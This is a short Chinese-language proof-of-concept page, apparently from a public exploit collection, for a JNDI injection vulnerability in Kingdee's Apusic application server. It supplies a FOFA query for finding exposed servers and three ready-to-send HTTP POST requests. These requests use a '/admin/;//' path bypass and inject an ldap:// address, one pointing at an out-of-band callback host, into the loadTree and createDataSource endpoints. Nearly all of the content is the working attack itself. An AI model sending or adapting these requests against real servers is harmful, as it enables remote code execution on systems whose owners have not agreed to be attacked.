## 金蝶Apusic应用服务器loadTree JNDI注入漏洞

## fofa
```
app="Apusic应用服务器"
```

## poc
```
POST /appmonitor/protect/jndi/loadTree HTTP/1.1
host:127.0.0.1

jndiName==ldap://地址



POST /admin/;//protect/jndi/loadTree HTTP/1.1
host:127.0.0.1

jndiName==ldap://地址



POST /admin/;//protect/datasource/createDataSource HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Content-Length: 260
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: application/x-www-form-urlencoded

name=nobg7&jndiName=ldap://cm38sdn1l3f79d1jb0jgoahe856jrdjkg.oast.site/ahsdhashduqwe&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=nobg7&userName=nobg7&password=nobg7&repassword=nobg7&connectionURL=sdasd&driverClassName=java.lang.String&testCommand=
```

![a519acd405e2e60c00108378f8410c8d](https://github.com/wy876/POC/assets/139549762/faa32ae9-f7b0-4a76-9990-74635d28bd2f)

![1dc3f827f335c01618f9dd9c4b39832b](https://github.com/wy876/POC/assets/139549762/6eff9f3b-df75-4008-b713-db61a32739bd)

![584c726b09f954433d5c3248ac5c1368](https://github.com/wy876/POC/assets/139549762/dfe99f4f-d6eb-4869-a2f8-59d792d9dac4)

![02678af9ca19b8ee1104c874943e5f94](https://github.com/wy876/POC/assets/139549762/09aba93a-9c71-4924-9314-28f054ce2fd7)


##漏洞来源
- https://mp.weixin.qq.com/s/iEHmFOKq5LT2x9Hp1ysLIw
